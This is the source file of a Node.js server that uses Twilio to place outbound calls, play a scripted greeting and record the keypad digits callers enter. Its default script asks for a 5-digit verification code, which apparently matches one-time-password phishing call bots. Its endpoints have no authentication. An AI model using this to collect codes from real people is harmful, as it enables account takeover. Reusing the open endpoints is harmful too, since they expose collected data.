require("dotenv").config();
const express = require("express");
const cors = require("cors");
const path = require("path");
const fs = require("fs");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());
app.use(express.static("public"));

const SETTINGS_FILE = path.join(__dirname, "settings.json");
const SCRIPT_FILE = path.join(__dirname, "script.json");

const DEFAULT_SETTINGS = {
  accountSid: "", authToken: "", fromNumber: "",
  baseUrl: process.env.BASE_URL || "",
  voice: "alice", language: "en-US", companyName: "My Company"
};

const DEFAULT_SCRIPT = {
  greeting: {
    message: "Hello! Press 1 to continue, or press 2 to end this call.",
    timeout: 10,
    noInputMessage: "We did not receive your input. Goodbye."
  },
  steps: [
    { label: "Verification Code", message: "Please enter your 5-digit verification code, then press hash.", maxDigits: 5, timeout: 15, confirmMessage: "Thank you. " }
  ],
  successMessage: "Thank you. Your information has been received. Have a wonderful day. Goodbye.",
  cancelMessage: "No problem. Your request has been cancelled. Goodbye.",
  errorMessage: "We did not receive your input. Please call us back. Goodbye."
};

function loadSettings() {
  try { if (fs.existsSync(SETTINGS_FILE)) return { ...DEFAULT_SETTINGS, ...JSON.parse(fs.readFileSync(SETTINGS_FILE)) }; } catch(e) {}
  return { ...DEFAULT_SETTINGS };
}
function saveSettings(d) { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(d, null, 2)); }
function loadScript() {
  try { if (fs.existsSync(SCRIPT_FILE)) return JSON.parse(fs.readFileSync(SCRIPT_FILE)); } catch(e) {}
  return JSON.parse(JSON.stringify(DEFAULT_SCRIPT));
}
function saveScript(d) { fs.writeFileSync(SCRIPT_FILE, JSON.stringify(d, null, 2)); }
function makeTwilioClient() {
  const s = loadSettings();
  if (!s.accountSid || !s.authToken) return null;
  return require("twilio")(s.accountSid, s.authToken);
}

const callSessions = {};

app.get("/api/settings", (req, res) => {
  const s = loadSettings();
  res.json({ ...s, authToken: s.authToken ? "••••••••" + s.authToken.slice(-4) : "" });
});
app.post("/api/settings", (req, res) => {
  const current = loadSettings();
  const update = { ...current, ...req.body };
  if (req.body.authToken && req.body.authToken.startsWith("••")) update.authToken = current.authToken;
  saveSettings(update);
  res.json({ success: true });
});
app.get("/api/script", (req, res) => res.json(loadScript()));
app.post("/api/script", (req, res) => { saveScript(req.body); res.json({ success: true }); });
app.get("/api/sessions", (req, res) => {
  res.json(Object.values(callSessions).sort((a, b) => new Date(b.startTime) - new Date(a.startTime)));
});

app.post("/api/call", async (req, res) => {
  const { phoneNumber, label } = req.body;
  if (!phoneNumber) return res.status(400).json({ error: "Phone number required." });
  const settings = loadSettings();
  const client = makeTwilioClient();
  if (!client) return res.status(400).json({ error: "Twilio credentials not configured. Go to the Settings tab first." });
  try {
    const call = await client.calls.create({
      to: phoneNumber, from: settings.fromNumber,
      url: `${settings.baseUrl}/twiml/start`,
      statusCallback: `${settings.baseUrl}/twiml/status`,
      statusCallbackMethod: "POST",
      statusCallbackEvent: ["initiated", "ringing", "answered", "completed"]
    });
    callSessions[call.sid] = {
      callSid: call.sid, phone: phoneNumber, label: label || "Call",
      status: "initiated", statusDetail: "Dialing...",
      startTime: new Date().toISOString(), currentStep: -1, collected: []
    };
    res.json({ success: true, callSid: call.sid });
  } catch(err) { res.status(500).json({ error: err.message }); }
});

app.post("/twiml/start", (req, res) => {
  const { voice, language, baseUrl } = loadSettings();
  const script = loadScript();
  const { VoiceResponse } = require("twilio").twiml;
  const twiml = new VoiceResponse();
  const sid = req.body.CallSid;
  if (callSessions[sid]) callSessions[sid].statusDetail = "Playing greeting...";
  const g = twiml.gather({ numDigits: 1, action: `${baseUrl}/twiml/greeting-response`, method: "POST", timeout: script.greeting.timeout });
  g.say({ voice, language }, script.greeting.message);
  twiml.say({ voice, language }, script.greeting.noInputMessage);
  twiml.hangup();
  res.type("text/xml").send(twiml.toString());
});

app.post("/twiml/greeting-response", (req, res) => {
  const { voice, language, baseUrl } = loadSettings();
  const script = loadScript();
  const { VoiceResponse } = require("twilio").twiml;
  const twiml = new VoiceResponse();
  const sid = req.body.CallSid;
  const digit = req.body.Digits;
  if (digit === "2") {
    if (callSessions[sid]) { callSessions[sid].status = "cancelled"; callSessions[sid].statusDetail = "Caller declined"; }
    twiml.say({ voice, language }, script.cancelMessage); twiml.hangup();
    return res.type("text/xml").send(twiml.toString());
  }
  if (digit === "1") {
    if (callSessions[sid]) { callSessions[sid].status = "in-progress"; callSessions[sid].statusDetail = "Accepted — starting steps"; }
    return res.redirect(307, `${baseUrl}/twiml/step/0`);
  }
  twiml.say({ voice, language }, "Invalid input. " + script.greeting.message);
  twiml.redirect(`${baseUrl}/twiml/start`);
  res.type("text/xml").send(twiml.toString());
});

app.all("/twiml/step/:index", (req, res) => {
  const { voice, language, baseUrl } = loadSettings();
  const script = loadScript();
  const { VoiceResponse } = require("twilio").twiml;
  const index = parseInt(req.params.index, 10);
  const step = script.steps[index];
  const sid = req.body.CallSid;
  const twiml = new VoiceResponse();
  if (!step) {
    if (callSessions[sid]) { callSessions[sid].status = "completed"; callSessions[sid].statusDetail = "All steps completed"; }
    twiml.say({ voice, language }, script.successMessage); twiml.hangup();
    return res.type("text/xml").send(twiml.toString());
  }
  if (callSessions[sid]) { callSessions[sid].currentStep = index; callSessions[sid].statusDetail = `Waiting: ${step.label}`; }
  const g = twiml.gather({ numDigits: step.maxDigits, finishOnKey: "#", action: `${baseUrl}/twiml/collect/${index}`, method: "POST", timeout: step.timeout });
  g.say({ voice, language }, step.message);
  twiml.say({ voice, language }, script.errorMessage);
  twiml.hangup();
  res.type("text/xml").send(twiml.toString());
});

app.post("/twiml/collect/:index", (req, res) => {
  const { voice, language, baseUrl } = loadSettings();
  const script = loadScript();
  const { VoiceResponse } = require("twilio").twiml;
  const index = parseInt(req.params.index, 10);
  const sid = req.body.CallSid;
  const digits = req.body.Digits;
  const step = script.steps[index];
  const twiml = new VoiceResponse();
  if (callSessions[sid]) {
    callSessions[sid].collected.push({ step: index, label: step.label, value: digits, time: new Date().toISOString() });
    callSessions[sid].currentStep = index + 1;
    callSessions[sid].statusDetail = `Received: ${step.label}`;
  }
  if (index === script.steps.length - 1 && digits === "2") {
    if (callSessions[sid]) { callSessions[sid].status = "cancelled"; callSessions[sid].statusDetail = "Caller cancelled"; }
    twiml.say({ voice, language }, script.cancelMessage); twiml.hangup();
    return res.type("text/xml").send(twiml.toString());
  }
  if (step.confirmMessage) twiml.say({ voice, language }, step.confirmMessage);
  twiml.redirect(`${baseUrl}/twiml/step/${index + 1}`);
  res.type("text/xml").send(twiml.toString());
});

app.post("/twiml/status", (req, res) => {
  const sid = req.body.CallSid;
  const cs = req.body.CallStatus;
  if (callSessions[sid]) {
    const s = callSessions[sid];
    if (cs === "ringing") { s.statusDetail = "Ringing..."; }
    else if (cs === "answered") { s.status = "in-progress"; s.statusDetail = "Connected"; }
    else if (cs === "completed" && !["cancelled","completed"].includes(s.status)) { s.status = "completed"; s.statusDetail = "Call ended"; }
    else if (["no-answer","busy","failed"].includes(cs)) { s.status = cs; s.statusDetail = cs.replace("-"," "); }
    if (["completed","cancelled","no-answer","busy","failed"].includes(cs)) s.endTime = new Date().toISOString();
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`\n✅ IVR System → http://localhost:${PORT}\n`));
